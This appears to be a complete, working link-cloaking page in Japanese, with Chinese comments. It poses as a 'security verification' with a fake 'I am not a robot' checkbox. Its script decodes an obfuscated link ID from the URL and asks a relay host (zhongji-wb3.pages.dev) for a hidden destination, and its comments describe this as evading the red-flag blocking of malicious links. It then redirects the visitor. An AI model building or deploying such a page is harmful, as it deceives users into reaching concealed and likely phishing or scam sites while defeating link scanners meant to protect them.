<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>セキュリティ確認</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="robots" content="noindex,nofollow" />
  <style>
    body{font-family:"Noto Sans JP",sans-serif;background:#f6f9fc;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center}
    .card{background:#fff;border:1px solid #e5e9ef;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.05);padding:28px;max-width:420px;width:92%;}
    h1{font-size:18px;margin:0 0 8px}
    p{color:#666;margin:4px 0}
    .loader{border:5px solid #f3f3f3;border-top:5px solid #3498db;border-radius:50%;width:42px;height:42px;animation:spin 1s linear infinite;margin:18px auto;display:none}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    label{display:flex;align-items:center;gap:8px;margin-top:12px}
    input[type=checkbox]{transform:scale(1.3)}
    button{margin-top:16px;padding:10px 18px;border:0;border-radius:6px;background:#6b7280;color:#fff;cursor:not-allowed}
    button.enabled{background:#2563eb;cursor:pointer}
    .msg{margin-top:12px;font-size:13px;color:#059669;display:none}
    .err{color:#dc2626}
    small{display:block;margin-top:16px;color:#9ca3af}
  </style>
</head>
<body>
  <div class="card">
    <h1>セキュリティ確認中...</h1>
    <p id="step">リンクを検証しています。しばらくお待ちください。</p>
    <div class="loader" id="loader"></div>

    <div id="verify" style="display:none;">
      <label><input type="checkbox" id="chk" />私はロボットではありません</label>
      <button id="goBtn" disabled>続行</button>
      <div class="msg" id="ok">✅ 検証に成功しました。リダイレクト中...</div>
      <p class="err" id="err" style="display:none;"></p>
    </div>

    <small>Cloud Edge Verification</small>
  </div>

  <script>
    /* ========== 多中继配置：顺序随机 + 记忆上次可用 ========== */
    const RELAYS = [
      "https://zhongji-wb3.pages.dev",
      "https://zhongji-wb3.pages.dev",
      "https://zhongji-wb3.pages.dev",
      // "https://relay-x.yourdomain.com",
    ];
    const ENDPOINT_PATH = "/api/resolve"; // 中继统一路径

    /* ========== 工具 ========== */
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a}
    function withTimeout(promise, ms=7000){
      return Promise.race([promise, new Promise((_,rej)=>setTimeout(()=>rej(new Error("timeout")),ms))]);
    }

    /* ========== Base58 (用于“混淆路径ID”的封装/还原 enc) ========== */
    const B58 = (() => {
      const ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
      const MAP = Object.fromEntries([...ALPH].map((c,i)=>[c,i]));
      function encode(binStr){ // 这里直接把 enc 当作 UTF-8 字符串做“迷彩”封装
        const bytes = new TextEncoder().encode(binStr);
        let x = BigInt(0);
        for (const b of bytes) x = (x<<8n) + BigInt(b);
        if (x === 0n) return "1";
        let out = "";
        while (x > 0n){ const r = Number(x % 58n); out = ALPH[r] + out; x = x / 58n; }
        return out;
      }
      function decode(b58){
        let x = 0n;
        for (const ch of b58){ const v = MAP[ch]; if (v==null) throw new Error("bad b58"); x = x*58n + BigInt(v); }
        // 恢复为 UTF-8 字符串
        const bytes = [];
        while (x > 0n){ bytes.unshift(Number(x & 255n)); x >>= 8n; }
        return new TextDecoder().decode(new Uint8Array(bytes));
      }
      return { encode, decode };
    })();

    /* ========== 从 URL 获取 enc（优先 fragment，其次路径混淆，最后 query?k） ========== */
    function getEncFromUrl() {
      const u = new URL(location.href);

      // 1) fragment（防红主力） —— 成功则不看其他模式
      if (u.hash && u.hash.length > 1) {
        const enc = u.hash.substring(1).trim();
        if (enc) return { enc, mode: "fragment" };
      }

      // 2) 路径混淆： .../<mix>/verify.html
      const parts = u.pathname.split("/").filter(Boolean);
      if (parts.length >= 2 && parts.at(-1) === "verify.html") {
        const mix = parts.at(-2);
        if (mix) {
          try {
            const enc = B58.decode(mix); // 还原 enc
            if (enc) return { enc, mode: "path-mix" };
          } catch {}
        }
      }

      // 3) 兜底 query： .../verify.html?k=<mix>
      const mixParam = u.searchParams.get("k");
      if (mixParam) {
        try {
          const enc = B58.decode(mixParam);
          if (enc) return { enc, mode: "query-mix" };
        } catch {}
      }

      return { enc: null, mode: null };
    }

    /* ========== 主流程 ========== */
    (async () => {
      const step = document.getElementById('step');
      const loader = document.getElementById('loader');
      const verifyBox = document.getElementById('verify');
      const chk = document.getElementById('chk');
      const goBtn = document.getElementById('goBtn');
      const okMsg = document.getElementById('ok');
      const err = document.getElementById('err');

      loader.style.display = 'block';

      const { enc: encId, mode } = getEncFromUrl();

      if (!encId) {
        loader.style.display = 'none';
        step.innerText = '無効なリンクです。';
        return;
      }

      // fragment 成功 → 严格禁止再尝试其他模式（防止互相干扰/破坏防红）
      // path/query 混淆模式仅在 fragment 缺失时才会触发

      // 中继优先级：上次成功 → 随机
      const lastGood = localStorage.getItem("relay:last_good");
      const relays = RELAYS.slice();
      if (lastGood && relays.includes(lastGood)) {
        relays.splice(relays.indexOf(lastGood), 1);
        relays.unshift(lastGood);
      } else {
        shuffle(relays);
      }

      let target = null, lastError = null;
      for (const relay of relays) {
        try {
          const url = `${relay}${ENDPOINT_PATH}?enc=${encodeURIComponent(encId)}&t=${Date.now()}&r=${Math.random().toString(36).slice(2)}`;
          const r = await withTimeout(fetch(url, { method: 'GET', credentials: 'omit', cache: 'no-store' }), 7000);
          if (!r.ok) throw new Error('HTTP ' + r.status);
          const j = await r.json();
          if (j && j.url) {
            target = j.url;
            localStorage.setItem("relay:last_good", relay);
            break;
          } else {
            throw new Error(j?.error || "invalid_response");
          }
        } catch (e) {
          lastError = e.message || String(e);
          await sleep(120 + Math.random()*250);
          continue;
        }
      }

      if (!target) {
        loader.style.display = 'none';
        step.innerText = 'リンクの検証に失敗しました。';
        err.style.display = 'block';
        err.innerText = 'エラー: ' + (lastError || 'unknown');
        return;
      }

      // 显示勾选再跳
      loader.style.display = 'none';
      step.innerText = '手動確認が必要です。チェックを入れて続行してください。';
      verifyBox.style.display = 'block';

      chk.addEventListener('change', () => {
        const ok = !!chk.checked;
        goBtn.disabled = !ok;
        goBtn.classList.toggle('enabled', ok);
      });

      goBtn.addEventListener('click', () => {
        goBtn.disabled = true;
        okMsg && (okMsg.style.display = 'block');
        const a = document.createElement('a');
        a.href = target;
        a.rel = 'noreferrer noopener';
        document.body.appendChild(a);
        a.click();
      });
    })();
  </script>
</body>
</html>
